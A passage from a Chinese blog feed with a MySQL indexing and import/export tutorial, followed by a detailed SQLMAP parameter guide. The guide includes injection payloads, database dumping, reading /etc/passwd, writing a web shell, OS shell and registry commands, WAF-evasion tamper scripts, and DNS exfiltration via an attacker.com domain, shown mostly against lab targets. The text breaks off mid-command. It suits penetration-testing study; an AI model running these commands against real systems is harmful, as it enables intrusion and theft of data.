      <link href="/2014/05/07/MySQL/MySQL%E7%B4%A2%E5%BC%95%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"/>
      <url>/2014/05/07/MySQL/MySQL%E7%B4%A2%E5%BC%95%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a><strong>索引</strong></h4><ul><li><p>定义</p><ul><li>对数据库中表的一列或者多列的值进行排序的一种结构(MySQL中索引用Btree方式)</li></ul></li><li><p>索引的优点</p><ul><li>可以加快数据的检索速度</li></ul></li><li><p>索引的缺点</p><ul><li>当对表中的数据进行增加,修改,删除的时候,索引需要动态维护,降低了数据的维护速度</li><li>索引需要占用物理存储空间(数据库目录/var/lib/mysql)</li></ul></li><li><p><strong>索引性能分析</strong></p><ul><li>开启性能分析: set profiling = 1</li><li>执行SQL命令:</li><li>查看性能分析结果: show profiles;</li><li>创建索引字段: <code>create index 索引名 on 表名(字段名);</code></li><li>执行SQL命令:</li><li>查看性能分析结果: show profiles;</li></ul></li></ul><h5 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a><strong>索引分类</strong></h5><ol><li><p><strong>普通索引</strong>(index)</p><ul><li><p>使用规则</p><ul><li>一个表中可以有多个index字段</li><li>字段的值可以有重复,也可以为NULL值</li><li>经常把做查询条件的字段设置为index字段</li><li>index字段的key标志为:MUL</li></ul></li><li><p>创建</p><ul><li>创建表时创建index  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table t1(</span><br><span class="line">... ...,</span><br><span class="line">... ...,</span><br><span class="line">index(id)</span><br><span class="line">index(name));</span><br></pre></td></tr></table></figure></li><li>在已有表中添加索引字段  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create index 索引名 on 表名(字段名);</span><br><span class="line"># 索引名一般和字段名一样,也可以随便</span><br></pre></td></tr></table></figure></li></ul></li><li><p>查看普通索引</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc 表名;#查看key标志为MUL</span><br><span class="line">show index from 表名\G;#查看详细信息</span><br></pre></td></tr></table></figure></li><li><p>删除索引</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop index 索引名 on 表名;</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>删除普通索引只能一个一个删除</li></ul></li></ul></li></ul></li><li><p><strong>唯一索引</strong></p><ul><li><p>使用规则</p><ul><li>一个表中可以有多个unique字段</li><li>unique字段的值不允许重复,可以为空值NULL</li><li>unique的KEY标志是 UNI</li></ul></li><li><p>创建(基本等同index创建)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table t1(</span><br><span class="line">... ...,</span><br><span class="line">... ...,</span><br><span class="line">unique(id)</span><br><span class="line">unique(name));</span><br></pre></td></tr></table></figure></li><li><p>已有表中创建</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create unique index 索引名 on 表名(字段名);</span><br></pre></td></tr></table></figure></li><li><p>查看,删除唯一索引</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc 表名;</span><br><span class="line">show index from 表名;</span><br><span class="line">drop index 索引名 on 表名;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>主键索引</strong> (primary key) &amp;&amp; 自增长属性(auto_increment)</p><ul><li>使用规则<ul><li>一个表中只能有一个主键字段</li><li>对应字段的值不允许重复且不能为空值NULL</li><li>主键字段的KEY标志为 PRI</li><li>把表中能够唯一标识一条记录的字段设置为主键,通常把表中记录编号的字段设置为主键</li></ul></li><li>创建主键(PRI)<ul><li>创建表时创建  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字段名 数据类型 primary key auto_increment,</span><br><span class="line"></span><br><span class="line">id int auto_increment,</span><br><span class="line">... ...,</span><br><span class="line">primary key(id,name)#复合主键</span><br></pre></td></tr></table></figure></li><li>删除主键<ul><li>先删除自增长属性(modify)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify id int primary key;</span><br></pre></td></tr></table></figure></li><li>删除主键<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop primary key;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>在已有表中添加主键  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add primary key(字段名);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>外键索引</strong></p><ul><li><p>定义</p><ul><li>让当前表字段的值在另一个表的范围内选择</li></ul></li><li><p>语法格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreign key(参考字段名)</span><br><span class="line">references 被参考表名(被参考字段名)</span><br><span class="line">on delete 级联动作</span><br><span class="line">on update 级联动作</span><br></pre></td></tr></table></figure></li><li><p>级联动作</p><ul><li>eascade : 数据级联更新<ul><li>当主表删除记录或者更新被参考字段的值时,从表会级联更新</li></ul></li><li>restrict 默认<ul><li>当删除主表记录时,如果从表中有相关联记录则不允许主表删除</li><li>更新同理</li></ul></li><li>set null<ul><li>当主表删除记录时,从表中相关联记录的字段值自动设置为NULL</li><li>更新同理</li></ul></li><li>no action  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">on delete no action on update no action</span><br><span class="line"># 同 restrict,都是立即检查外键限制</span><br></pre></td></tr></table></figure></li></ul></li><li><p>删除外键</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop foreign key 外键名;</span><br></pre></td></tr></table></figure><ul><li>外键名的查看方式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show create table 表名;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>已有表中添加外键</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 会受到表中原有数据的限制</span><br><span class="line">alter table 表名 add foreign key(参考字段名)</span><br><span class="line">references 被参考表名(被参考字段名)</span><br><span class="line">on delete 级联动作</span><br><span class="line">on update 级联动作;</span><br></pre></td></tr></table></figure></li><li><p>外键使用规则</p><ul><li>两张表被参考字段和参考字段数据类型要一致</li><li>被参考字段必须是 key 的一种,通常是 primary key</li></ul></li></ul></li></ol><h4 id="数据导入"><a href="#数据导入" class="headerlink" title="数据导入"></a><strong>数据导入</strong></h4><ul><li>作用: 把文件系统的内容导入到数据库中<ul><li>语法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;文件名&quot;</span><br><span class="line">into table 表名</span><br><span class="line">fields terminated by &quot;分隔符&quot;</span><br><span class="line">lines terminated by &quot;\n&quot;</span><br></pre></td></tr></table></figure></li><li>示例  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">把 &#96;&#x2F;etc&#x2F;passwd&#96; 文件中的内容导入到db2库下的userinfo表</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">用户名:密码:UID号:GID号:用户描述:用户家目录:登录权限</span><br></pre></td></tr></table></figure></li><li>操作步骤<ul><li>在数据库中创建对应的表<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create table userinfo(</span><br><span class="line">username char(20),</span><br><span class="line">password char(1),</span><br><span class="line">uid int,</span><br><span class="line">gid int,</span><br><span class="line">comment varchar(50),</span><br><span class="line">homedir varchar(50),</span><br><span class="line">shell varchar(50)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ul></li><li>将要导入的文件拷贝到数据库的默认搜索路径中<ul><li>查看数据库的默认搜索路径<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql-files</span><br><span class="line"></span><br><span class="line">sudo cp &#x2F;etc&#x2F;passwd &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;</span><br></pre></td></tr></table></figure></li><li>执行数据导入语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">into table userinfo</span><br><span class="line">fields terminated by &quot;:&quot;</span><br><span class="line">lines terminated by &quot;\n&quot;;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a><strong>数据导出</strong></h4><ul><li>作用<ul><li>将数据库表中的记录保存到系统文件里</li></ul></li><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select ... from 表名</span><br><span class="line">into outfile &quot;文件名&quot;</span><br><span class="line">fields terminated by &quot;分割符&quot;</span><br><span class="line">lines terminated by &quot;\n&quot;;</span><br></pre></td></tr></table></figure></li><li>把userinfo表中的username,password和uid导出到文件user.txt  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select username,password,uid from userinfo</span><br><span class="line">into outfile &quot;&#x2F;tmp&#x2F;user.txt&quot;</span><br><span class="line">fields terminated by &quot;,&quot;</span><br><span class="line">lines terminated by &quot;\n&quot;;</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>导出的内容由SQL查询语句决定</li><li>执行导出命令时路径必须指定对应的数据库搜索路径</li></ul></li></ul></li></ul><h4 id="表的复制"><a href="#表的复制" class="headerlink" title="表的复制"></a><strong>表的复制</strong></h4><ul><li><p>语法格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table 表名 select 查询命令;</span><br></pre></td></tr></table></figure></li><li><p>示例</p><ul><li>复制userinfo表中的全部记录到userinfo2<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table userinfo2 select * from userinfo;</span><br></pre></td></tr></table></figure></li><li>复制userinfo表中username,password,uid三个字段的第2-10条纪录到userinfo3<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table userinfo3 select username,password,uid from userinfo limit 1,9;</span><br></pre></td></tr></table></figure></li><li>复制表结构<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table 表名 select 查询命令 where false;</span><br></pre></td></tr></table></figure></li><li>注意<ul><li>复制表的时候不会把原有表的key属性复制过来</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 索引 </tag>
            
            <tag> mysql </tag>
            
            <tag> SQL查询 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMAP自动注入参数详解</title>
      <link href="/2014/05/06/Web_Attacks/SQL_Injection/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
      <url>/2014/05/06/Web_Attacks/SQL_Injection/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a><strong>SQLMAP自动注入</strong></h4><p>开源sql注入漏洞检测,利用工具<br>检测动态页面中get/post参数,cookie,http头<br>数据榨取<br>文件系统访问<br>操作系统命令行<br>引擎强大,特性丰富<br>XSS漏洞检测</p></blockquote><h5 id="五种漏洞检测技术"><a href="#五种漏洞检测技术" class="headerlink" title="五种漏洞检测技术"></a><strong>五种漏洞检测技术</strong></h5><ul><li><p>基于布尔的盲注检测</p></li><li><p>基于时间的盲注检测<br>  <code>&#39; and (select * from (select(sleep(20)))a)--+</code></p></li><li><p>基于错误的检测</p></li><li><p>基于UNION联合查询的检测<br>  <em>适用于通过循环直接输出联合查询结果,否则只显示每一项结果</em></p></li><li><p>基于堆叠查询的检测<br>  <em>;堆叠多个查询语句</em><br>  <em>适用于非select的数据修改,删除的操作</em></p></li><li><p>支持的数据库管理系统DBMS<br>  <code>MYSQL,Oracle,PostgreSQL Server,Microsoft Access,IBM DB2,SQLite,Firebird,Sybase,SAP MaxDB</code></p></li></ul><h4 id="其它特性"><a href="#其它特性" class="headerlink" title="其它特性"></a><strong>其它特性</strong></h4><p>数据库直接连接 -d<br>    不通过SQL注入,制定身份认证信息,IP,端口<br>与burpsuite,google结合使用,支持正则表达式限定测试目标<br>Get,post,cookie,Referer,User-Agent(随机或指定)<br>    Cookie过期后自动处理Set-Cookie头,更新cookie信息<br>限速:最大并发,延迟发送<br>支持Basic,Digest,NTLM,CA身份认证<br>数据库版本,用户,权限,hash枚举和字典破解,暴力破解表列名称<br>文件上传下载,UDF,启动并执行储存过程,操作系统命令执行,访问windows注册表<br>与w3af,metasploit集成结合使用,基于数据库服务进程提权和上传执行后门</p><p><strong>基于python2.7 开发</strong></p><p><strong>安装</strong></p><pre><code>apt-get install gitgit clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></pre><p><strong>升级</strong></p><pre><code>sqlmap --update        #在线git pull            #离线Kali集成版随kali库更新</code></pre><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a><strong>基本使用</strong></h4><pre><code>sqlmap -h &amp; -hhsqlmap -d &quot;mysql://root:@192.168.190.163:3306/dvwa&quot; -f --users --banner --dbs --schema -asqlmap --version -v</code></pre><p><strong>日志</strong><br>    <code>.sqlmap</code><br><strong>输出</strong></p><ul><li>输出内容详细度分7个等级</li></ul><p><strong>Get方法</strong></p><pre><code>sqlmap -u &quot;http://192.168.190.163/mutillidae/index.php?page=userinfo.php&amp;username=11&amp;password=22&amp;user-info-php-submit-button=View +Account+Details&quot; -p username -f</code></pre><p><strong>扫描URL列表文件</strong></p><pre><code>http://1.1.1.1/vuln1.php?q=foobarhttp://1.1.1.1/vuln3/id/1*sqlmap -m list.txt</code></pre><p><strong>扫描google搜索结果</strong></p><pre><code>sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></pre><p><strong>POST方法</strong></p><pre><code>使用http请求文件(burpsuite)    sqlmap -r request.txt使用burpsuite log文件    sqlmap -l log.txt</code></pre><p><strong>HTTPS</strong></p><pre><code>sqlmap -u &quot;https://1.1.1.1/a.php?id=1:8843&quot; --force-ssl</code></pre><p><strong>扫描配置文件</strong></p><pre><code>sqlmap -c sqlmap.conf</code></pre><h4 id="SQLMAP自动注入—Request"><a href="#SQLMAP自动注入—Request" class="headerlink" title="SQLMAP自动注入—Request"></a><strong>SQLMAP自动注入—Request</strong></h4><pre><code>数据段:    --dataget / post都适用splmap -u &quot;http://1.1.1.1/a.php&quot; --data&quot;user=1&amp;pass=2&quot; -f变量分隔符: --param-delhttp://1.1.1.1/a.php?q=foo;id=1        // ; &amp;sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;q=foo;id=1&quot; --param-del=&quot;;&quot; -fcookie头: --cookieweb应用需要基于cookie的身份认证检查cookie中的注入点(level&gt;=2)Set-Cookie / --drop-set-cookie / --cookie-delsqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --cookie=&quot;a=1;b=2&quot; -f--user-agent    sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)     #默认user-agent--random-agent        #随机user-agent    /usr/share/sqlmap/txt/user-agents.txt sqlmap检查user-agent中的注入点:Level&gt;=3APP/WAF/IPS/IDS过滤异常user-agent时报错    [hh:mm:20] [ERROR] the target URL responded with an unknown HTTP status code, try to force the HTTP User-Agent header with option --useragent or --random-agentHost头: --host=&quot;&quot;Level 5Referer头:    --referrerLevel&gt;=3定义的header: --headers每个头单独一行(名称区分大小写)*sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --headers=&quot;host:www.a.com\nUser-Agent:owl&quot;--method=GET/POST</code></pre><p><strong>基于HTTP协议的身份验证</strong></p><ul><li>Basic</li><li>Digest</li><li>NTLM<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.php?id&#x3D;1&quot; --auth-type Basic --auth-cred &quot;user:pass&quot;</span><br><span class="line"></span><br><span class="line">--auth-cert &#x2F; --auth-file</span><br><span class="line">&#96;--auth-file&#x3D;&quot;ca.PEM&quot;&#96;</span><br><span class="line"> 有私钥的PEM格式证书文件</span><br><span class="line">PEM格式的证书链文件</span><br></pre></td></tr></table></figure></li></ul><p><strong>http(s)代理</strong></p><pre><code>--proxy=&quot;http://127.0.0.1:8087/&quot;--proxy-cred=&quot;name:pass&quot;--ignore-proxy    忽略系统级代理设置,通常用于扫描本地网络目标sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8087&quot; -f--delay    每次http(s)请求之间,浮点数,单位为秒,默认无延迟--timeout    请求超时时间,浮点数,默认为30秒--retries    http(s)连接超时重试次数,默认3次--randomize    长度,类型与原始值保持一致的前提下,指定每次请求随机取值的参数名        sqlmap -u http://1.1.1.1/a.php?id=100 -randomize=&quot;id&quot;--scope    过滤日志内容,通过正则表达式筛选扫描对象    sqlmap -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;    sqlmap -l 2.log --scope=&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs    User-agent中的注入点--safe-url / --safe-freq    检测和盲注阶段会产生大量失败请求,服务器端可能因此销毁session    每发送--safe-freq次注入请求后,发送一次正常请求--skip-urlencode    默认Get方法会对传输内容进行编码,某些WEB服务器不遵守RFC标准编码,使用原始字符提交数据--eval    每次请求前执行指定的python代码    每次请求更改或增加新的参数值(时间依赖,其他参数值依赖)    sqlmap -u &quot;http://1.1.1.1/a.php? id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code></pre><h4 id="SQLMAP自动注入—Optimization-优化参数"><a href="#SQLMAP自动注入—Optimization-优化参数" class="headerlink" title="SQLMAP自动注入—Optimization    #优化参数"></a><strong>SQLMAP自动注入—Optimization</strong>    #优化参数</h4><p><strong>优化性能</strong></p><pre><code>--predict-output    根据检测方法,比对返回值和统计表内容,不断缩小检测范围,提高检测效率    版本名,用户名,密码,Privileges,role,数据库名称,表名,列名与--threads参数不兼容    统计表:/usr/share/sqlmap/txt/common-outputs.txt--keep-alive    使用http(s)长连接,性能好    与--proxy参数不兼容    长连接避免重复建立连接的网络开销,但大量长连接会严重占用服务器资源--null-connection    只获取相应页面的大小值,而非页面具体内容    通常用于盲注判断 真/假,降低网络带宽消耗    与--text-only参数不兼容(基于页面内容的比较判断 真/假)--threads    最大并发线程    盲注时每个线程获取一个字符(7次请求),获取完成后线程结束    默认值为1,建议不要超过10,否则可能影响站点可用性    与--predict-output参数不兼容-o    开启前三个性能参数(除--threads参数)</code></pre><h4 id="SQLMAP自动注入—Injection-注入"><a href="#SQLMAP自动注入—Injection-注入" class="headerlink" title="SQLMAP自动注入—Injection    #注入"></a><strong>SQLMAP自动注入—Injection</strong>    #注入</h4><pre><code>-p    指定扫描的参数,使--level失效    -p &quot;user-agent,referer&quot;--URI注入点    sqlmap -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;--dbms=&quot;mysql&quot;    MySQL&lt;5.0&gt;    Oracle&lt;11i&gt;    Microsoft SQL Server &lt;2005&gt;    PostgreSQL    Microsoft Access    SQLite    Firebird    Sybase    SAP MaxDB    DB2--OS    Linux    Windows--invalid-bignum / --invalid-logical    通常sqlmap使用负值使参数取值失效 id=13-&gt; id=-13    bignum使用大数使参数值失效 id=99999999    Logcal使用布尔判断使取值失效id=13 AND 18=19--no-cast    榨取数据时,sqlmap将所有结果转换为字符串,并用空格替换NULL结果    老版本mysql数据库需要开启此开关--no-escape    出于混淆和避免出错的目的,payload中用单引号界定字符串时,sqlmap使用char()编码逃逸的方法替换字符串    SELECT &apos;foo&apos; -&gt; SELECT CHAR(102)+CHAR(111)+CHAR(111)     本参数将关闭此功能--prefix / --suffix    $query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;    sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot;  -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc“     query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;;--tamper    #常用    混淆脚本,用于绕过应用层过滤,IPS,WAF    sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=&quot;between.py,randomcase.py,space2comment.py&quot; -v 3    dpkg -L sqlmap | grep tamper    #kali查找脚本所在路径</code></pre><h4 id="SQLMAP自动注入—Detection-检测"><a href="#SQLMAP自动注入—Detection-检测" class="headerlink" title="SQLMAP自动注入—Detection    #检测"></a><strong>SQLMAP自动注入—Detection</strong>    #检测</h4><pre><code>--level    1-5级(默认1)    /usr/share/sqlmap/xml/payloads--risk    1-4(默认 1/ 无害)    Risk升高可造成数据被篡改等风险(update)--string,--not-string,--regexp,--code,--text--only,--titles    页面比较,基于布尔的注入检测,依据返回页面内容的变化判断真假逻辑,但有些页面随时间阈值变化,此时需要人为指定标识真假的字符串.</code></pre><h4 id="SQLMAP自动注入—Techniques-技术"><a href="#SQLMAP自动注入—Techniques-技术" class="headerlink" title="SQLMAP自动注入—Techniques    #技术"></a><strong>SQLMAP自动注入—Techniques</strong>    #技术</h4><pre><code>默认使用全部技术B:Boolean-based blindE:Error-basedU:Union query-basedS:Stacked queries(文件系统,操作系统,注册表必须)T:Time-based blind--time-sec    基于时间的注入检测相应延迟时间(默认5秒)--union-cols    默认联合查询1-10列,随--level增加最多支持50列    --union-cols 6-9--union-char    联合查询默认使用NULL,极端情况下NULL可能失败,此时可以手动指定数值    --union-char 123--dns-domain    攻击者控制了某DNS服务器,使用此功能可以提高数据榨取的速度    --dns-domain attacker.com--second-order    在一个页面注入的结果,从另一个页面体现出来    --second-order http://1.1.1.1/b.php</code></pre><h4 id="SQLMAP自动注入—Fingerprint-指纹信息"><a href="#SQLMAP自动注入—Fingerprint-指纹信息" class="headerlink" title="SQLMAP自动注入—Fingerprint        #指纹信息"></a><strong>SQLMAP自动注入—Fingerprint</strong>        #指纹信息</h4><pre><code>-f,--fingerprint,-b,--banner    数据库管理系统指纹信息    DBMS,操作系统,架构,补丁</code></pre><h4 id="SQLMAP自动注入—Enumeration-枚举"><a href="#SQLMAP自动注入—Enumeration-枚举" class="headerlink" title="SQLMAP自动注入—Enumeration        #枚举"></a><strong>SQLMAP自动注入—Enumeration</strong>        #枚举</h4><pre><code>--current-user        #查当前数据库账号--current-db        #查当前数据库--hostname            #查主机名--users                #查数据库管理系统所有账号--privileges -U username    (CU 当前账号)    #查用户权限--roles                #查角色--dbs                #查所有数据库--tables,--exclude-sysdbs -D dvwa    #排除系统库,指定数据库查表查列-T users -D dvwa -C user --columns    #指定列查询数据--schema --batch --exclude-sysdbs 元数据(使用默认选项)    #表结构--count                #计数Dump数据    --dump,-C,-T,-D,--start,--stop        #分段备份数据    --dump-all -exclude-sysdbs            #备份所有数据    --sql-query &quot;select * from users&quot;    #根据sql查询语句dump数据</code></pre><h4 id="SQLMAP自动注入—Brute-Force-暴力破解"><a href="#SQLMAP自动注入—Brute-Force-暴力破解" class="headerlink" title="SQLMAP自动注入—Brute Force        #暴力破解"></a><strong>SQLMAP自动注入—Brute Force</strong>        #暴力破解</h4><pre><code>Mysql &lt; 5.0,没有information_schema库Mysql &gt;= 5.0,但无权读取information_schema库微软的access数据库,默认无权读取MSysObjects库--common-tables            #暴力破解表--common-columns    (Access系统表无列信息)    #暴力破解表的列</code></pre><h4 id="SQLMAP自动注入—UDF-Injection-用户自定义函数注入"><a href="#SQLMAP自动注入—UDF-Injection-用户自定义函数注入" class="headerlink" title="SQLMAP自动注入—UDF Injection    #用户自定义函数注入"></a><strong>SQLMAP自动注入—UDF Injection</strong>    #用户自定义函数注入</h4><pre><code>--udf-inject , --shared-lib编译共享库创建并上传至DB Server,以此生成UDF实现高级注入Linux: shared objectWindows: DLLhttp://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</code></pre><h4 id="SQLMAP自动注入—File-System-文件系统访问"><a href="#SQLMAP自动注入—File-System-文件系统访问" class="headerlink" title="SQLMAP自动注入—File System    #文件系统访问"></a><strong>SQLMAP自动注入—File System</strong>    #文件系统访问</h4><pre><code>--file-read=&quot;/etc/passwd&quot;     #读文件--file-write=&quot;shell.php&quot; --file-dest &quot;/tmp/shell.php&quot;    #写文件并通过--file-dest指定存放位置</code></pre><h4 id="SQLMAP自动注入—OS-操作系统访问"><a href="#SQLMAP自动注入—OS-操作系统访问" class="headerlink" title="SQLMAP自动注入—OS        #操作系统访问"></a><strong>SQLMAP自动注入—OS</strong>        #操作系统访问</h4><pre><code>Mysql,postgresql    上传共享库并生成sys_exec(),sys_eval()两个UDFMssql    xp_cmdshell    储存过程(有就用,禁了启,没有建)    --os-cmd    --os-shell    --sql-shell</code></pre><h4 id="SQLMAP自动注入—Windows-Registory-Windows注册表注入修改"><a href="#SQLMAP自动注入—Windows-Registory-Windows注册表注入修改" class="headerlink" title="SQLMAP自动注入—Windows Registory        #Windows注册表注入修改"></a><strong>SQLMAP自动注入—Windows Registory</strong>        #Windows注册表注入修改</h4><pre><code>--reg-read--reg-add--reg-del--reg-key,--reg-value,--reg-data,--reg-typesqlmap –u=&quot;http://1.1.1.1/a.aspx?id=1&quot; --reg-add --regkey=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test -reg-type=REG_SZ --reg-data=1</code></pre><h4 id="SQLMAP自动注入—General-一般常用参数"><a href="#SQLMAP自动注入—General-一般常用参数" class="headerlink" title="SQLMAP自动注入—General        #一般常用参数"></a><strong>SQLMAP自动注入—General</strong>        #一般常用参数</h4><pre><code>-s: sqllite会话文件保存位置-t:    记录流量文件保存位置--charset:强制字符编码    --charset=GBK--crawl: 从起始位置爬站深度    --batch --crawl=3--cvs-del: dump数据默认存于&quot;,&quot;分割的CSV文件中,指定其它分隔符    --csv-del=&quot;;&quot;--dbms-cred:指定数据库账号--flush-session: 清空session--force-ssl            #注入https的网站--fresh-queries        #忽略session查询结果--hex                #dump非ASCLL字符内容时,将其编码为16进制形式,收到后解码还原    sqlmap -u &quot;http://1.1.1.1/s.php?id=1&quot; --hex -v 3--output-dir=/tmp--parse-errors        #分析和现实数据库内建报错信息    sqlmap.py -u &quot;http://1.1.1.1/sqlmap/a.asp?id=1&quot; --parse-errors--save                #将命令保存成配置文件</code></pre><h4 id="SQLMAP自动注入—Miscellaneous-杂项参数"><a href="#SQLMAP自动注入—Miscellaneous-杂项参数" class="headerlink" title="SQLMAP自动注入—Miscellaneous    #杂项参数"></a><strong>SQLMAP自动注入—Miscellaneous</strong>    #杂项参数</h4><pre><code>-z        #参数助记符sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u “1.1.1.1/a.php?id=1&quot;sqlmap -z &quot;bat,randoma,ign,tec=BEU&quot; -u “1.1.1.1/a.php?id=1&quot; sqlmap --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u “1.1.1.1/a.php?id=1&quot; sqlmap -z 